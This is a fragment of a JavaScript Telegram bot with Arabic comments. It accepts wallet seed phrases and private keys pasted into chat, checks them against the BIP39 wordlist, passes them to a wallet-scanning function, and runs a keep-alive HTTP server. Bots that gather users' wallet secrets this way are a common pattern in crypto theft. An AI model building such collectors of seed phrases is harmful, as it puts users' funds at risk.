  // إذا لم يوجد أي منهما، محاولة التعامل مع النص كما هو (للتوافق مع النسخة القديمة)
  if (privateKeys.length === 0 && mnemonics.length === 0) {
    const cleanedText = cleanMnemonic(msg.text);
    // التحقق إذا كان النص المنظف يحتوي على كلمات من قائمة BIP39
    const words = cleanedText.split(/\s+/);
    const mnemonicWordList = bip39.wordlists.english;
    const validWords = words.filter(word => mnemonicWordList.includes(word));

    // إذا كان أكثر من 50% من الكلمات صالحة، نعتبره منيمونك محتمل
    if (validWords.length >= 6 && validWords.length / words.length > 0.5) {
      await scanWallet(cleanedText, chatId, userName);
    } else {
      const errorMessage = isAdmin(chatId) ?
        "❌ لم يتم العثور على كلمات سرية أو مفاتيح خاصة أو عناوين محافظ صالحة في النص." :
        "❌ No valid seed phrases, private keys, or wallet addresses found in the text.";
      await bot.sendMessage(chatId, errorMessage);
    }
  }
});

// إزالة الـ webhook والاعتماد على polling فقط
console.log('🤖 بوت تلجرام قيد التشغيل...');
console.log('📡 يستخدم polling mode للاتصال مع تلجرام');

// التأكد من إزالة أي webhook سابق
(async () => {
  try {
    await bot.deleteWebHook();
    console.log('✅ تم إزالة الـ webhook بنجاح');
  } catch (error) {
    console.log('ℹ️ لا يوجد webhook ليتم إزالته');
  }
})();
import http from 'http';
const PORT = process.env.PORT || 5000;

http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('🤖 Telegram bot is running.\n');
}).listen(PORT, '0.0.0.0', () => {
  console.log(`🌐 HTTP server listening on port ${PORT}`);
});
